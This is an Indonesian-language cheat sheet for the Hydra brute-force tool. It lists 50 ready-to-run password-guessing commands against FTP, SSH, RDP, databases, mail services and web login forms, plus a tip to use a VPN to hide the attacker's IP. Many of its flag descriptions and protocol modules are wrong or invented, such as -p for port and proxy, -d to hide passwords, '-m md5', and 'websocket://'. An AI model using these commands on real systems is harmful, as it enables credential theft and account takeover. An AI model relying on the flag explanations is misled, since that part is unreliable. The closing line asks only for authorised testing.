Cheat Sheet Hydra

Pengenalan

Hydra adalah alat untuk melakukan serangan brute-force terhadap berbagai layanan dengan banyak protokol.

Instalasi

# Untuk menginstal Hydra di sistem berbasis Debian/Ubuntu:
sudo apt-get install hydra

Penggunaan Dasar

# Untuk memulai serangan brute-force pada FTP:
hydra -l username -P /path/to/passwords.txt ftp://target_ip

50 Contoh Penggunaan Hydra

1. Serangan Brute-force FTP

hydra -l admin -P passwords.txt ftp://192.168.1.1

2. Serangan Brute-force SSH

hydra -l root -P passwords.txt ssh://192.168.1.1

3. Serangan Brute-force HTTP Form

hydra -l admin -P passwords.txt http-form://192.168.1.1/login.php:username=^USER^&password=^PASS^:F=incorrect

4. Menggunakan file username

hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1

5. Serangan Brute-force terhadap MySQL

hydra -l root -P passwords.txt mysql://192.168.1.1

6. Serangan Brute-force terhadap Telnet

hydra -l admin -P passwords.txt telnet://192.168.1.1

7. Serangan Brute-force terhadap POP3

hydra -l user -P passwords.txt pop3://192.168.1.1

8. Serangan Brute-force terhadap IMAP

hydra -l user -P passwords.txt imap://192.168.1.1

9. Serangan Brute-force terhadap RDP

hydra -l user -P passwords.txt rdp://192.168.1.1

10. Menggunakan opsi -t untuk menentukan jumlah thread

hydra -l admin -P passwords.txt -t 4 ftp://192.168.1.1

11. Menggunakan opsi -w untuk menentukan waktu tunggu

hydra -l admin -P passwords.txt -w 5 ftp://192.168.1.1

12. Menentukan protokol yang berbeda

hydra -l admin -P passwords.txt http://192.168.1.1

13. Serangan Brute-force terhadap SQL

hydra -l root -P passwords.txt sql://192.168.1.1

14. Serangan Brute-force terhadap LDAP

hydra -l user -P passwords.txt ldap://192.168.1.1

15. Menentukan port yang digunakan

hydra -l admin -P passwords.txt -p 8080 http://192.168.1.1

16. Menggunakan opsi -f untuk berhenti setelah menemukan password

hydra -l admin -P passwords.txt -f ftp://192.168.1.1

17. Menggunakan proxy untuk melakukan serangan

hydra -l admin -P passwords.txt -p http://127.0.0.1:8080 ftp://192.168.1.1

18. Menggunakan format data kustom untuk HTTP

hydra -l admin -P passwords.txt http-form://192.168.1.1/login.php:username=^USER^&password=^PASS^:F=incorrect

19. Menggunakan opsi -V untuk verbose

hydra -l admin -P passwords.txt -V ftp://192.168.1.1

20. Menentukan waktu tunggu (timeout)

hydra -l admin -P passwords.txt -t 4 -w 5 ftp://192.168.1.1

21. Menentukan user-agent kustom untuk serangan HTTP

hydra -l admin -P passwords.txt -H "User-Agent: Mozilla/5.0" http://192.168.1.1

22. Menggunakan file password secara langsung

hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.1

23. Menentukan direktori untuk menyimpan hasil

hydra -l admin -P passwords.txt -o hasil.txt ftp://192.168.1.1

24. Menggunakan opsi -e untuk menentukan metode percobaan password

hydra -l admin -P passwords.txt -e ns ftp://192.168.1.1

25. Menggunakan opsi -d untuk tidak menunjukkan password yang ditemukan

hydra -l admin -P passwords.txt -d ftp://192.168.1.1

26. Menggunakan hash untuk password

hydra -l admin -P hash.txt -m md5 ftp://192.168.1.1

27. Menggunakan opsi -L untuk file username dengan banyak opsi

hydra -L usernames.txt -P passwords.txt ftp://192.168.1.1

28. Menentukan file hasil untuk lebih banyak output

hydra -l admin -P passwords.txt -o hasil_hydra.txt ftp://192.168.1.1

29. Menggunakan metode serangan spesifik

hydra -l admin -P passwords.txt -s 8080 http-get://192.168.1.1/login.php

30. Serangan pada WebSocket

hydra -l admin -P passwords.txt websocket://192.168.1.1

31. Menggunakan opsi -g untuk menargetkan subdomain

hydra -l admin -P passwords.txt -g subdomain.target.com ftp://192.168.1.1

32. Menggunakan -d untuk menghindari serangan ke host yang sama

hydra -l admin -P passwords.txt -d ftp://192.168.1.1

33. Menentukan pengulangan untuk serangan

hydra -l admin -P passwords.txt -R ftp://192.168.1.1

34. Menyimpan hasil ke dalam file JSON

hydra -l admin -P passwords.txt -o hasil.json ftp://192.168.1.1

35. Menggunakan --help untuk bantuan

hydra --help

36. Menggunakan GUI untuk Hydra

hydra-gui

37. Menggunakan VPN untuk menyembunyikan IP

# Hubungkan ke VPN sebelum menjalankan Hydra

38. Menggunakan port yang tidak biasa

hydra -l admin -P passwords.txt -p 8888 ftp://192.168.1.1

39. Menggunakan karakter spesial dalam password

hydra -l admin -P "p@ssw0rd!" ftp://192.168.1.1

40. Menggunakan proxy dengan SOCKS5

hydra -l admin -P passwords.txt -p socks5://127.0.0.1:1080 ftp://192.168.1.1

41. Menggunakan variasi pada password

hydra -l admin -P passwords.txt -e ns -e a ftp://192.168.1.1

42. Menentukan timeout koneksi

hydra -l admin -P passwords.txt -t 4 -w 5 -t 3 ftp://192.168.1.1

43. Menggunakan OpenSSL untuk enkripsi

hydra -l admin -P passwords.txt openssl://192.168.1.1

44. Menentukan delay antar percobaan

hydra -l admin -P passwords.txt -d 5 ftp://192.168.1.1

45. Menyimpan hasil ke dalam CSV

hydra -l admin -P passwords.txt -o hasil.csv ftp://192.168.1.1

46. Menggunakan URL dinamis

hydra -l admin -P passwords.txt http://192.168.1.1/login.php?dynamic_param=value

47. Serangan terhadap API dengan token

hydra -l admin -P passwords.txt http-form://192.168.1.1/api/login:username=^USER^&password=^PASS^:F=incorrect

48. Menggunakan -d untuk tidak menampilkan password

hydra -l admin -P passwords.txt -d ftp://192.168.1.1

49. Melakukan brute-force terhadap MongoDB

hydra -l admin -P passwords.txt mongodb://192.168.1.1

50. Menggunakan Hydra dalam mode headless

hydra -l admin -P passwords.txt -f -o hasil.txt ftp://192.168.1.1

Catatan Penting

- Gunakan Hydra dengan izin yang tepat pada server yang Anda targetkan.
- Hasil dari Hydra harus digunakan untuk tujuan pengujian keamanan yang sah.
